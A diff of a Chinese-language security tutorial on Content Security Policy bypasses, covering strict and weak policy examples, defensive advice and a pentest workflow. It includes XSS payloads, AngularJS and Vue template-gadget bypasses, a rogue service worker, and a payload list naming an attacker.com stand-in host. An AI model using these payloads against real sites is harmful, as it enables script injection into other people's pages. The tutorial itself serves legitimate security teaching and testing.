@@ -6,6 +6,21 @@
 
 ---
 
+## 📚 前置知识
+
+在开始本配方之前，建议先掌握以下内容：
+
+| 知识领域 | 重要程度 | 参考资料 |
+|----------|---------|---------|
+| CORS 与同源策略 | 必需 | [CORS 与同源策略](../01-Foundations/cors_and_same_origin_policy.md) |
+| HTTP/HTTPS 协议 | 必需 | [HTTP/HTTPS 协议](../01-Foundations/http_https_protocol.md) |
+| JavaScript 基础 | 必需 | [JavaScript 基础](../01-Foundations/javascript_basics.md) |
+| Chrome DevTools | 推荐 | [浏览器开发者工具](../02-Tooling/browser_devtools.md) |
+
+> 💡 **提示**: CSP 是 Web 安全的重要防线。理解 CSP 的绕过技术有助于安全测试和漏洞挖掘，同时也帮助理解目标网站的安全配置。
+
+---
+
 ## 基础概念
 
 ### 定义
@@ -56,22 +71,22 @@ Content-Security-Policy: directive source; directive source
 
 ```http
 Content-Security-Policy:
-  default-src 'none';
-  script-src 'nonce-random123' 'strict-dynamic';
-  style-src 'nonce-random456';
-  img-src 'self' https:;
-  font-src 'self';
-  connect-src 'self';
-  base-uri 'none';
-  form-action 'self';
+default-src 'none';
+script-src 'nonce-random123' 'strict-dynamic';
+style-src 'nonce-random456';
+img-src 'self' https:;
+font-src 'self';
+connect-src 'self';
+base-uri 'none';
+form-action 'self';
 ```
 
 #### 宽松 CSP (易受攻击)
 
 ```http
 Content-Security-Policy:
-  default-src 'self';
-  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com;
+default-src 'self';
+script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com;
 ```
 
 ### 主要绕过技术
@@ -118,18 +133,18 @@ Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
 ```html
 <!-- unsafe-inline 允许内联脚本 -->
 <script>
-  alert(document.domain);
+alert(document.domain);
 </script>
 
 <!-- unsafe-eval 允许 eval -->
 <script>
-  eval("alert(1)");
+eval("alert(1)");
 </script>
 <script>
-  setTimeout("alert(1)", 0);
+setTimeout("alert(1)", 0);
 </script>
 <script>
-  Function("alert(1)")();
+Function("alert(1)")();
 </script>
 ```
 
@@ -169,7 +184,7 @@ Content-Security-Policy: script-src 'self'
 
 <!-- 攻击者注入 -->
 <script nonce="abc123">
-  alert(1);
+alert(1);
 </script>
 ```
 
@@ -191,7 +206,7 @@ Content-Security-Policy: script-src 'self'
 <div id="app">{{ constructor.constructor('alert(1)')() }}</div>
 <script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
 <script>
-  new Vue({ el: "#app" });
+new Vue({ el: "#app" });
 </script>
 ```
 
@@ -275,9 +290,9 @@ navigator.serviceWorker.register("/evil-sw.js");
 
 // evil-sw.js
 self.addEventListener("fetch", (event) => {
-  if (event.request.url.includes("legitimate.js")) {
-    event.respondWith(new Response("alert(1)"));
-  }
+if (event.request.url.includes("legitimate.js")) {
+event.respondWith(new Response("alert(1)"));
+}
 });
 ```
 
@@ -292,21 +307,21 @@ self.addEventListener("fetch", (event) => {
 ```javascript
 // 提取页面的 CSP 策略
 function getCSP() {
-  // 方法1: 从 meta 标签
-  const metaCSP = document.querySelector(
-    'meta[http-equiv="Content-Security-Policy"]'
-  );
-  if (metaCSP) {
-    console.log("Meta CSP:", metaCSP.content);
-  }
+// 方法1: 从 meta 标签
+const metaCSP = document.querySelector(
+'meta[http-equiv="Content-Security-Policy"]'
+);
+if (metaCSP) {
+console.log("Meta CSP:", metaCSP.content);
+}
 
-  // 方法2: 通过违规测试
-  const img = new Image();
-  img.onerror = () => console.log("Image blocked by CSP");
-  img.src = "https://attacker.com/test.jpg";
+// 方法2: 通过违规测试
+const img = new Image();
+img.onerror = () => console.log("Image blocked by CSP");
+img.src = "https://attacker.com/test.jpg";
 
-  // 方法3: 查看控制台错误
-  console.log("Check console for CSP violations");
+// 方法3: 查看控制台错误
+console.log("Check console for CSP violations");
 }
 
 getCSP();
@@ -317,26 +332,26 @@ getCSP();
 ```javascript
 // CSP Bypass Checker
 const payloads = [
-  "<script>alert(1)</script>",
-  "<img src=x onerror=alert(1)>",
-  "<svg onload=alert(1)>",
-  '<iframe src="javascript:alert(1)">',
-  '<base href="https://attacker.com/">',
-  '<link rel="import" href="https://attacker.com/evil.html">',
-  '<object data="data:text/html,<script>alert(1)</script>">',
+"<script>alert(1)</script>",
+"<img src=x onerror=alert(1)>",
+"<svg onload=alert(1)>",
+'<iframe src="javascript:alert(1)">',
+'<base href="https://attacker.com/">',
+'<link rel="import" href="https://attacker.com/evil.html">',
+'<object data="data:text/html,<script>alert(1)</script>">',
 ];
 
 function testCSP() {
-  payloads.forEach((payload, i) => {
-    try {
-      const div = document.createElement("div");
-      div.innerHTML = payload;
-      document.body.appendChild(div);
-      console.log(`Payload ${i} injected:`, payload);
-    } catch (e) {
-      console.log(`Payload ${i} blocked:`, e.message);
-    }
-  });
+payloads.forEach((payload, i) => {
+try {
+const div = document.createElement("div");
+div.innerHTML = payload;
+document.body.appendChild(div);
+console.log(`Payload ${i} injected:`, payload);
+} catch (e) {
+console.log(`Payload ${i} blocked:`, e.message);
+}
+});
 }
 
 testCSP();
@@ -347,29 +362,29 @@ testCSP();
 ```html
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta
-      http-equiv="Content-Security-Policy"
-      content="script-src 'self' https://ajax.googleapis.com"
-    />
-  </head>
-  <body>
-    <!-- 加载 AngularJS -->
-    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+<head>
+<meta
+http-equiv="Content-Security-Policy"
+content="script-src 'self' https://ajax.googleapis.com"
+/>
+</head>
+<body>
+<!-- 加载 AngularJS -->
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
 
-    <!-- CSP 绕过 -->
-    <div ng-app ng-csp>
-      {{ constructor.constructor('alert(document.domain)')() }}
-    </div>
+<!-- CSP 绕过 -->
+<div ng-app ng-csp>
+{{ constructor.constructor('alert(document.domain)')() }}
+</div>
 
-    <!-- 或者使用 ng-focus -->
-    <input
-      ng-app
-      ng-csp
-      ng-focus="constructor.constructor('alert(1)')()"
-      autofocus
-    />
-  </body>
+<!-- 或者使用 ng-focus -->
+<input
+ng-app
+ng-csp
+ng-focus="constructor.constructor('alert(1)')()"
+autofocus
+/>
+</body>
 </html>
 ```
 
@@ -381,73 +396,73 @@ testCSP();
 
 1. **使用严格的 CSP**
 
-   ```http
-   Content-Security-Policy:
-     default-src 'none';
-     script-src 'nonce-RANDOM' 'strict-dynamic';
-     object-src 'none';
-     base-uri 'none';
-   ```
+```http
+Content-Security-Policy:
+default-src 'none';
+script-src 'nonce-RANDOM' 'strict-dynamic';
+object-src 'none';
+base-uri 'none';
+```
 
 2. **避免使用不安全的指令**
 
-   - 禁用 `'unsafe-inline'`
-   - 禁用 `'unsafe-eval'`
-   - 禁用 `data:` URI（对于脚本）
+- 禁用 `'unsafe-inline'`
+- 禁用 `'unsafe-eval'`
+- 禁用 `data:` URI（对于脚本）
 
 3. **使用 Nonce 或 Hash**
 
-   ```html
-   <!-- 每次请求生成随机 nonce -->
-   <script nonce="{{ random_nonce }}">
-     // 内联脚本
-   </script>
-   ```
+```html
+<!-- 每次请求生成随机 nonce -->
+<script nonce="{{ random_nonce }}">
+// 内联脚本
+</script>
+```
 
 4. **限制 CDN 白名单**
 
-   - 仅允许必要的 CDN
-   - 使用 SRI (Subresource Integrity) 验证
+- 仅允许必要的 CDN
+- 使用 SRI (Subresource Integrity) 验证
 
-   ```html
-   <script
-     src="https://cdn.example.com/lib.js"
-     integrity="sha384-..."
-     crossorigin="anonymous"
-   ></script>
-   ```
+```html
+<script
+src="https://cdn.example.com/lib.js"
+integrity="sha384-..."
+crossorigin="anonymous"
+></script>
+```
 
 5. **使用 CSP 报告**
-   ```http
-   Content-Security-Policy-Report-Only:
-     default-src 'self';
-     report-uri /csp-report
-   ```
+```http
+Content-Security-Policy-Report-Only:
+default-src 'self';
+report-uri /csp-report
+```
 
 ### 攻击方（渗透测试）
 
 1. **收集信息**
 
-   - 查看 HTTP 响应头
-   - 检查 `<meta>` 标签
-   - 查看控制台 CSP 违规报告
+- 查看 HTTP 响应头
+- 检查 `<meta>` 标签
+- 查看控制台 CSP 违规报告
 
 2. **识别弱点**
 
-   - 是否使用 `unsafe-inline` 或 `unsafe-eval`
-   - 白名单是否包含可利用的 CDN
-   - 是否缺少 `base-uri` 限制
+- 是否使用 `unsafe-inline` 或 `unsafe-eval`
+- 白名单是否包含可利用的 CDN
+- 是否缺少 `base-uri` 限制
 
 3. **构造 Payload**
 
-   - 根据允许的来源选择攻击向量
-   - 测试 Script Gadgets
-   - 尝试协议级绕过
+- 根据允许的来源选择攻击向量
+- 测试 Script Gadgets
+- 尝试协议级绕过
 
 4. **验证绕过**
-   - 在浏览器中测试
-   - 检查是否触发 CSP 违规
-   - 确认代码执行
+- 在浏览器中测试
+- 检查是否触发 CSP 违规
+- 确认代码执行
 
 ---
 
@@ -497,7 +512,7 @@ Content-Security-Policy: script-src 'nonce-random' 'strict-dynamic'
 
 ```html
 <script nonce="r@nd0m">
-  alert(1);
+alert(1);
 </script>
 ```
 
